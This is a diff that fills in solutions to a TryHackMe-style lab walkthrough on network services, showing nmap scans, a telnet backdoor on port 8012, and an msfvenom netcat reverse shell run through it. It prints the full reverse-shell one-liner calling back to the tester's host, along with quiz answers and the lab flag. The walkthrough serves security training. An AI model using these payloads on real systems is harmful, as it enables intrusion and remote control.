@@ -653,7 +653,7 @@ enumerating network services, we need to be thorough in our method.
 
 Let's start out the same way we usually do, a port scan, to find out as much information
 as we can about the services, applications, structure and operating
-system of the target machine. Scan the machine with nmap.
+system of the target machine. Scan the machine with `nmap`.
 
 ### Output
 
@@ -663,20 +663,84 @@ Let's see what's going on on the target server...
 
 How many ports are open on the target machine?
 
-***Correct answer:***
+*Solution:* My target machine's IP is 10.10.234.88.
+
+```bash
+❯ export ip=10.10.234.88
+# (Adding the -p- flag means all ports get checked instead of just the first 1000, 
+# the -T5 flag makes the process quite a bit quicker).
+❯ nmap $ip -p- -vv -T5
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-01 10:13 +03
+Initiating Ping Scan at 10:13
+Scanning 10.10.234.88 [2 ports]
+Completed Ping Scan at 10:13, 0.07s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 10:13
+Completed Parallel DNS resolution of 1 host. at 10:13, 0.03s elapsed
+Initiating Connect Scan at 10:13
+Scanning 10.10.234.88 [65535 ports]
+Warning: 10.10.234.88 giving up on port because retransmission cap hit (2).
+Connect Scan Timing: About 7.55% done; ETC: 10:20 (0:06:20 remaining)
+Connect Scan Timing: About 15.33% done; ETC: 10:19 (0:05:37 remaining)
+Connect Scan Timing: About 23.12% done; ETC: 10:19 (0:05:03 remaining)
+Connect Scan Timing: About 32.64% done; ETC: 10:20 (0:04:41 remaining)
+Connect Scan Timing: About 40.56% done; ETC: 10:20 (0:04:03 remaining)
+Connect Scan Timing: About 48.07% done; ETC: 10:20 (0:03:32 remaining)
+Connect Scan Timing: About 56.22% done; ETC: 10:19 (0:02:56 remaining)
+Connect Scan Timing: About 64.45% done; ETC: 10:19 (0:02:21 remaining)
+Connect Scan Timing: About 71.65% done; ETC: 10:19 (0:01:53 remaining)
+Discovered open port 8012/tcp on 10.10.234.88
+Connect Scan Timing: About 79.87% done; ETC: 10:19 (0:01:20 remaining)
+Connect Scan Timing: About 87.50% done; ETC: 10:19 (0:00:49 remaining)
+Completed Connect Scan at 10:20, 407.30s elapsed (65535 total ports)
+Nmap scan report for 10.10.234.88
+Host is up, received conn-refused (0.10s latency).
+Scanned at 2025-06-01 10:13:15 +03 for 407s
+Not shown: 46076 closed tcp ports (conn-refused), 19458 filtered tcp ports (no-response)
+PORT     STATE SERVICE REASON
+8012/tcp open  unknown syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 407.46 seconds
+```
+
+***Correct answer: 1***
 
 What port is this?
 
-***Correct answer:***
+***Correct answer: 8012***
 
 This port is unassigned, but still lists the protocol it's using,
 what protocol is this?
 
-***Correct answer:***
+***Correct answer: tcp***
 
 Now re-run the nmap scan, without the -p- tag, how many ports show up as open?
 
-***Correct answer:***
+*Solution:*
+
+```bash
+❯ nmap $ip -vv -T5
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-01 10:21 +03
+Initiating Ping Scan at 10:21
+Scanning 10.10.234.88 [2 ports]
+Completed Ping Scan at 10:21, 0.19s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 10:21
+Completed Parallel DNS resolution of 1 host. at 10:21, 0.02s elapsed
+Initiating Connect Scan at 10:21
+Scanning 10.10.234.88 [1000 ports]
+Warning: 10.10.234.88 giving up on port because retransmission cap hit (2).
+Completed Connect Scan at 10:21, 8.50s elapsed (1000 total ports)
+Nmap scan report for 10.10.234.88
+Host is up, received conn-refused (0.11s latency).
+Scanned at 2025-06-01 10:21:33 +03 for 9s
+All 1000 scanned ports on 10.10.234.88 are in ignored states.
+Not shown: 634 closed tcp ports (conn-refused), 366 filtered tcp ports (no-response)
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 8.74 seconds
+```
+
+***Correct answer: 0***
 
 Here, we see that by assigning telnet to a non-standard port, it is not part of the
 common ports list, or top 1000 ports, that nmap scans. It's important to try every angle
@@ -686,11 +750,95 @@ when enumerating, as the information you gather here will inform your exploitati
 
 Based on the title returned to us, what do we think this port could be used for?
 
-***Correct answer:***
+*Solution:* Focus on a single port, output it to a text file:
+
+```bash
+❯ nmap $ip -p 8012 -v -A -T4 -oN nmap.out
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-01 10:58 +03
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 10:58
+Completed NSE at 10:58, 0.00s elapsed
+Initiating NSE at 10:58
+Completed NSE at 10:58, 0.00s elapsed
+Initiating NSE at 10:58
+Completed NSE at 10:58, 0.00s elapsed
+Initiating Ping Scan at 10:58
+Scanning 10.10.234.88 [2 ports]
+Completed Ping Scan at 10:58, 0.07s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 10:58
+Completed Parallel DNS resolution of 1 host. at 10:58, 0.03s elapsed
+Initiating Connect Scan at 10:58
+Scanning 10.10.234.88 [1 port]
+Discovered open port 8012/tcp on 10.10.234.88
+Completed Connect Scan at 10:58, 0.07s elapsed (1 total ports)
+Initiating Service scan at 10:58
+Scanning 1 service on 10.10.234.88
+Completed Service scan at 11:00, 159.06s elapsed (1 service on 1 host)
+NSE: Script scanning 10.10.234.88.
+Initiating NSE at 11:00
+Completed NSE at 11:00, 0.16s elapsed
+Initiating NSE at 11:00
+Completed NSE at 11:00, 1.16s elapsed
+Initiating NSE at 11:00
+Completed NSE at 11:00, 0.00s elapsed
+Nmap scan report for 10.10.234.88
+Host is up (0.072s latency).
+
+PORT     STATE SERVICE VERSION
+8012/tcp open  unknown
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
+|_    SKIDY'S BACKDOOR. Type .HELP to view commands
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8012-TCP:V=7.94SVN%I=7%D=6/1%Time=683C0817%P=x86_64-pc-linux-gnu%r(
+SF:NULL,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comma
+SF:nds\n")%r(GenericLines,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20t
+SF:o\x20view\x20commands\n")%r(GetRequest,2E,"SKIDY'S\x20BACKDOOR\.\x20Typ
+SF:e\x20\.HELP\x20to\x20view\x20commands\n")%r(HTTPOptions,2E,"SKIDY'S\x20
+SF:BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(RTSPReques
+SF:t,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands
+SF:\n")%r(RPCCheck,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20vi
+SF:ew\x20commands\n")%r(DNSVersionBindReqTCP,2E,"SKIDY'S\x20BACKDOOR\.\x20
+SF:Type\x20\.HELP\x20to\x20view\x20commands\n")%r(DNSStatusRequestTCP,2E,"
+SF:SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r
+SF:(Help,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comm
+SF:ands\n")%r(SSLSessionReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x2
+SF:0to\x20view\x20commands\n")%r(TerminalServerCookie,2E,"SKIDY'S\x20BACKD
+SF:OOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(TLSSessionReq,2
+SF:E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n"
+SF:)%r(Kerberos,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\
+SF:x20commands\n")%r(SMBProgNeg,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HEL
+SF:P\x20to\x20view\x20commands\n")%r(X11Probe,2E,"SKIDY'S\x20BACKDOOR\.\x2
+SF:0Type\x20\.HELP\x20to\x20view\x20commands\n")%r(FourOhFourRequest,2E,"S
+SF:KIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(
+SF:LPDString,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20
+SF:commands\n")%r(LDAPSearchReq,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HEL
+SF:P\x20to\x20view\x20commands\n")%r(LDAPBindReq,2E,"SKIDY'S\x20BACKDOOR\.
+SF:\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(SIPOptions,2E,"SKIDY
+SF:'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(LAND
+SF:esk-RC,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20com
+SF:mands\n")%r(TerminalServer,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\
+SF:x20to\x20view\x20commands\n")%r(NCP,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x
+SF:20\.HELP\x20to\x20view\x20commands\n");
+
+NSE: Script Post-scanning.
+Initiating NSE at 11:00
+Completed NSE at 11:00, 0.00s elapsed
+Initiating NSE at 11:00
+Completed NSE at 11:00, 0.00s elapsed
+Initiating NSE at 11:00
+Completed NSE at 11:00, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 160.86 seconds
+```
+
+***Correct answer: a backdoor***
 
 Who could it belong to? Gathering possible usernames is an important step in enumeration.
 
-***Correct answer:***
+***Correct answer: SKIDY***
 
 Always keep a note of information you find during your enumeration stage,
 so you can refer back to it when you move on to try exploits.
@@ -755,23 +903,33 @@ connection, resulting in code or command execution being achieved.
 Okay, let's try and connect to this telnet port!
 If you get stuck, have a look at the syntax for connecting outlined above.
 
+*Solution:*
+
+```bash
+❯ telnet $ip 8012
+Trying 10.10.234.88...
+Connected to 10.10.234.88.
+Escape character is '^]'.
+SKIDY'S BACKDOOR. Type .HELP to view commands
+```
+
 ***Correct answer: No answer needed***
 
 Great! It's an open telnet connection! What welcome message do we receive?
 
-***Correct answer:***
+***Correct answer: SKIDY’S BACKDOOR***
 
 Let's try executing some commands, do we get a return on any
 input we enter into the telnet session? (Y/N)
 
-***Correct answer:***
+***Correct answer: N***
 
 Hmm... that's strange. Let's check to see if what we're
 typing is being executed as a system command.
 
 ***Correct answer: No answer needed***
 
-Start a tcpdump listener on your local machine.
+Start a `tcpdump` listener on your local machine.
 
 If using your own machine with the OpenVPN connection, use:
 
@@ -788,20 +946,50 @@ sudo tcpdump ip proto \\icmp -i ens5
 This starts a tcpdump listener, specifically listening for ICMP traffic,
 which pings operate on.
 
+*Solution:*
+
+```bash
+❯ sudo tcpdump ip proto \\icmp -i tun0
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+```
+
 ***Correct answer: No answer needed***
 
 Now, use the command "`ping [local THM ip] -c 1`" through the telnet session
 to see if we're able to execute system commands.
 Do we receive any pings? Note, you need to preface this with `.RUN` (Y/N)
 
-***Correct answer:***
+*Solution:* I am using my own machine with OpenVPN.
+
+To find my own address, look at the [access page](https://tryhackme.com/access)
+
+![access](access.png)
+
+In the Telnet session:
+
+```bash
+.RUN ping 10.9.0.168 -c 1
+```
+
+Then, in the other Terminal window with the TCP listener, we see:
+
+```bash
+❯ sudo tcpdump ip proto \\icmp -i tun0
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+11:16:36.951835 IP 10.10.234.88 > spam-B450M-S2H: ICMP echo request, id 1286, seq 1, length 64
+11:16:36.951872 IP spam-B450M-S2H > 10.10.234.88: ICMP echo reply, id 1286, seq 1, length 64
+```
+
+***Correct answer: Y***
 
 Great! This means that we are able to execute system commands AND
 that we are able to reach our local machine. Now let's have some fun!
 
-***Correct answer:***
+***Correct answer: No answer needed***
 
-We're going to generate a reverse shell payload using msfvenom.
+We're going to generate a reverse shell payload using `msfvenom`.
 This will generate and encode a netcat reverse shell for us.
 Here's our syntax:
 
@@ -816,7 +1004,50 @@ msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
 
 What word does the generated payload start with?
 
-***Correct answer:***
+*Solution:* First I had to install Metasploit framework on my own PC:
+
+```bash
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+chmod 755 msfinstall
+./msfinstall
+# Then run first-time setup:
+msfconsole
+```
+
+Now `msfvenom` is available on my PATH.
+
+To figure out the IP for the OpenVPN connection, use `ifconfig`
+
+```bash
+❯ ifconfig tun0
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet 10.9.0.168  netmask 255.255.0.0  destination 10.9.0.168
+        inet6 fe80::4f2a:ed4f:6106:1eef  prefixlen 64  scopeid 0x20<link>
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
+        RX packets 114677  bytes 4599098 (4.5 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 115991  bytes 6990060 (6.9 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+
+Finally, I used
+
+```bash
+❯ msfvenom -p cmd/unix/reverse_netcat lhost=10.9.0.168 lport=4444 R
+[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
+[-] No arch selected, selecting arch: cmd from the payload
+No encoder specified, outputting raw payload
+Payload size: 96 bytes
+mkfifo /tmp/ejqzmj; nc 10.9.0.168 4444 0</tmp/ejqzmj | /bin/sh >/tmp/ejqzmj 2>&1; rm /tmp/ejqzmj
+```
+
+The payload is
+
+```bash
+mkfifo /tmp/ejqzmj; nc 10.9.0.168 4444 0</tmp/ejqzmj | /bin/sh >/tmp/ejqzmj 2>&1; rm /tmp/ejqzmj
+```
+
+***Correct answer: mkfifo***
 
 Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:
 
@@ -826,17 +1057,30 @@ nc -lvnp [listening port]
 
 What would the command look like for the listening port we selected in our payload?
 
-***Correct answer:***
+***Correct answer: nc -lvnp 4444***
 
 Great! Now that's running, we need to copy and paste our msfvenom
 payload into the telnet session and run it as a command.
 Hopefully- this will give us a shell on the target machine!
 
+*Solution:* Run the netcat listener first
+
+```bash
+nc -lvnp 4444
+```
+
+Now run the payload inside the Telnet session
+
+```bash
+.RUN mkfifo /tmp/ejqzmj; nc 10.9.0.168 4444 0</tmp/ejqzmj | /bin/sh >/tmp/ejqzmj 2>&1; rm /tmp/ejqzmj
+.RUN mkfifo /tmp/ebxiy; nc 10.9.0.168 4444 0</tmp/ebxiy | /bin/sh >/tmp/ebxiy 2>&1; rm /tmp/ebxiy
+```
+
 ***Correct answer:***
 
 Success! What is the contents of flag.txt?
 
-***Correct answer:***
+***Correct answer: THM{y0u_g0t_th3_t3ln3t_fl4g}***
 
 ## Task 8: Understanding FTP
 
